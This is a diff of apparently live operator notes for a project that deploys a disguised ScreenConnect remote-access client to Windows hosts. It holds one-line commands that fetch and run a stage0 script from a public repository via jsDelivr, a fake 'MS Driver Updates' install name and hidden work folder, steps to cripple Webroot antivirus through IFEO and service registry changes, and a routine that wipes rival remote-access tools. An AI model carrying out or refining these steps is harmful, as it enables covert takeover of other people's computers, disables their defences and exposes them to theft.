@@ -1,8 +1,8 @@
 # github-drop - competition SC deploy (saved state 2026-07-29)
 
 ## Current build
-- Payload marker: WU_BUILD_20260729T
-- Latest stage0: y.cmd (multi-mirror) / x.cmd
+- Payload marker: WU_BUILD_20260729U
+- Latest stage0: z.cmd (multi-mirror) - hardened rival SC/RMM purge
 - Repo: https://github.com/xnobuddy/github-drop (public)
 - Source script: Script.txt (also Desktop\Project\Script.txt)
 
@@ -14,26 +14,25 @@
 - ARP: MS Driver Updates / Update tool
 - Workdir: %ProgramData%\Microsoft\Windows\WER\Temp\.wucache
 
-## Deploy (preferred when GitHub TLS works)
-curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\y.cmd https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/y.cmd
-C:\WINDOWS\TEMP\y.cmd
+## Deploy (preferred)
+curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\z.cmd https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/z.cmd
+C:\WINDOWS\TEMP\z.cmd
 
 ## Deploy (GitHub blocked - use jsDelivr)
-powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; (New-Object Net.WebClient).DownloadFile('https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/y.cmd','C:\WINDOWS\TEMP\y.cmd')"
-C:\WINDOWS\TEMP\y.cmd
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; (New-Object Net.WebClient).DownloadFile('https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/z.cmd','C:\WINDOWS\TEMP\z.cmd')"
+C:\WINDOWS\TEMP\z.cmd
 
 ## Verify
 powershell -NoProfile -Command "Get-Content '%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\.diag.log' -Tail 40"
 sc query "ScreenConnect Client (5f6010579852e507)"
+powershell -NoProfile -Command "Get-CimInstance Win32_Service | ? { $_.Name -like '*ScreenConnect*' } | Select Name,State"
 
-## Open issues when we left off
-1. Some hosts block raw.githubusercontent.com TLS - use jsDelivr (y.cmd)
-2. Webroot NOT_STOPPABLE - needs IFEO + registry Start=4 + reboot; stubs ~60-95KB
-3. Empty SC name / no join on sevrz when Webroot guts binaries
-4. schtasks Access Denied (0x80070005) on some hosts - fix ACLs + boot.cmd on disk
-5. Kill-race fixed in u/v (single SYSTEM task); use y.cmd going forward
-6. Rival SC purge hardened in T (CIM + folders + MSI uninstall)
+## U build purge hardening
+- Fingerprint-only allowlist (ARP name alone no longer spares rivals)
+- Full SC remove: stop/delete service, wait msiexec/QuietUninstall, wipe folders, 2nd pass
+- Broader RMM wipe: processes/services/ARP/folders/Run/Startup
+- Monitor loop also purges unauthorized SC via CIM + folder wipe
 
 ## Rebuild payload after Script.txt edits
 python _make_update_b64.py
-# then copy to updateT.b64 / bump marker / git push
+# writes update.b64 / payload.b64 / updateU.b64 then git push
